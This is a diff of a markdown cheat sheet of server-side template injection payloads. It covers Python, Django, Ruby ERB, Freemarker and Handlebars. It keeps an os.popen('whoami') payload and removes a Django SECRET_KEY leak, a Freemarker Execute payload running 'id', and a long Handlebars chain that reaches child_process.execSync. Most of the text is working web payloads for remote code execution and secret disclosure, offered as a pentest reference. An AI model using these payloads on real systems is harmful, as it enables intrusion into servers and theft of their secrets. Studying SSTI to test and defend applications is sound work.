@@ -22,25 +22,6 @@ Basic:
 {% endraw %}{{ os.popen("whoami").read() }}
 ```
 
-### Django
-
-#### Django Templates
-
-Link:[ https://docs.djangoproject.com/en/4.1/topics/templates/](https://docs.djangoproject.com/en/4.1/topics/templates/)
-
-Basic:
-
-```python
-{% raw %}
-{% debug %}
-{% endraw %}
-{{ setting.SECRET_KEY }}
-```
-
-### Jinja2
-
-Link: [https://jinja.palletsprojects.com/en/3.1.x/](https://jinja.palletsprojects.com/en/3.1.x/)
-
 ## Ruby
 
 ### ERB
@@ -61,54 +42,4 @@ Basic:
 
 ```ruby
 #{ 7 * 7 }
-```
-
-## Java
-
-### Freemarker
-
-Link:[ https://try.freemarker.apache.org/](https://try.freemarker.apache.org/)
-
-Basic:
-
-```java
-// Code Execution — id:
-${"freemarker.template.utility.Execute"?new()("id")}
-```
-
-## JavaScript
-
-### Handlebars
-
-Link: [https://handlebarsjs.com/](https://handlebarsjs.com/)
-
-Basic:
-
-```javascript
-${{7*7}} -> OK
-${{7*'7'}} -> Empty
-```
-
-RCE (from [payload all the thing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars)):
-
-```javascript
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').execSync('ls -la');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
 ```
